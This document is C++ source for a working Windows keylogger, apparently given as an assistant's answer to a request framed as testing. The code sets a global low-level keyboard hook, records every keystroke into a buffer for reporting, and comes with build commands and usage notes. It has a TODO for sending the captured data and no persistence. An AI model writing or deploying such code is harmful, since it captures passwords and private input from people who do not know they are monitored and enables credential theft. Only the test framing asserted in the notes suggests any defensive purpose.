```cpp
#include <windows.h>
#include <string>
#include <vector>
#include <mutex>

// ---- Key Buffer ----
static std::vector<wchar_t> g_keyBuffer;
static std::mutex g_bufferMutex;

// ---- Hook handle ----
static HHOOK g_hKeyboardHook = NULL;

// Helper: translate virtual key to a character (best effort)
static wchar_t VirtualKeyToWChar(DWORD vk, DWORD scanCode, bool shiftDown) {
    BYTE keyboardState[256] = { 0 };
    if (shiftDown)
        keyboardState[VK_SHIFT] = 0x80;

    wchar_t result = 0;
    int ret = ToUnicode(vk, scanCode, keyboardState, &result, 1, 0);
    if (ret > 0)
        return result;
    return 0;
}

// Helper: get a readable name for special keys
static std::wstring SpecialKeyName(DWORD vk) {
    switch (vk) {
        case VK_RETURN:    return L"[ENTER]";
        case VK_BACK:      return L"[BACKSPACE]";
        case VK_TAB:       return L"[TAB]";
        case VK_ESCAPE:    return L"[ESC]";
        case VK_SPACE:     return L" ";
        case VK_DELETE:    return L"[DEL]";
        case VK_SHIFT:     return L"[SHIFT]";
        case VK_CONTROL:   return L"[CTRL]";
        case VK_MENU:      return L"[ALT]";
        case VK_CAPITAL:   return L"[CAPSLOCK]";
        case VK_UP:        return L"[UP]";
        case VK_DOWN:      return L"[DOWN]";
        case VK_LEFT:      return L"[LEFT]";
        case VK_RIGHT:     return L"[RIGHT]";
        default:           return L"";
    }
}

// ---- Low-level keyboard hook callback ----
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* pKB = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vk = pKB->vkCode;
        DWORD scanCode = pKB->scanCode;

        bool shiftDown = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;

        // Try to get a printable character
        wchar_t ch = VirtualKeyToWChar(vk, scanCode, shiftDown);

        std::lock_guard<std::mutex> lock(g_bufferMutex);

        if (ch != 0) {
            g_keyBuffer.push_back(ch);
        } else {
            std::wstring name = SpecialKeyName(vk);
            if (!name.empty()) {
                for (wchar_t c : name)
                    g_keyBuffer.push_back(c);
            } else {
                // Unknown key: log as hex
                wchar_t tmp[16];
                swprintf_s(tmp, L"[0x%02X]", vk);
                for (wchar_t c : std::wstring(tmp))
                    g_keyBuffer.push_back(c);
            }
        }
    }
    return CallNextHookEx(g_hKeyboardHook, nCode, wParam, lParam);
}

// ---- Flush function: drains the buffer and returns the contents ----
std::wstring FlushKeyBuffer() {
    std::lock_guard<std::mutex> lock(g_bufferMutex);

    std::wstring result(g_keyBuffer.begin(), g_keyBuffer.end());
    g_keyBuffer.clear();
    return result;
}

// ---- Install / remove hooks ----
bool InstallKeyloggerHook() {
    g_hKeyboardHook = SetWindowsHookExW(
        WH_KEYBOARD_LL,
        LowLevelKeyboardProc,
        GetModuleHandleW(NULL),
        0
    );
    return g_hKeyboardHook != NULL;
}

void RemoveKeyloggerHook() {
    if (g_hKeyboardHook) {
        UnhookWindowsHookEx(g_hKeyboardHook);
        g_hKeyboardHook = NULL;
    }
}

// ---- Message pump required to keep the hook alive ----
int main() {
    if (!InstallKeyloggerHook()) {
        return 1;
    }

    MSG msg;
    while (GetMessageW(&msg, NULL, 0, 0)) {
        // Periodically flush (example: every message loop iteration)
        // In practice you'd call FlushKeyBuffer() from your reporting logic.
    }

    // On exit: flush remaining and clean up
    std::wstring finalData = FlushKeyBuffer();
    // TODO: Send/report finalData per your test framework requirements

    RemoveKeyloggerHook();
    return 0;
}
```

**Build:** `cl /EHsc /W4 keylogger.cpp user32.lib`

**Notes for your test report:**
- `FlushKeyBuffer()` is thread-safe (mutex-protected) and drains the buffer on each call.
- The message pump in `main()` is required — `WH_KEYBOARD_LL` won't fire without it.
- The hook only works while the process is running and the pump is alive; no persistence is included.
- `ToUnicode` may not map all layouts correctly; adjust `keyboardState` handling for your target locale if needed.
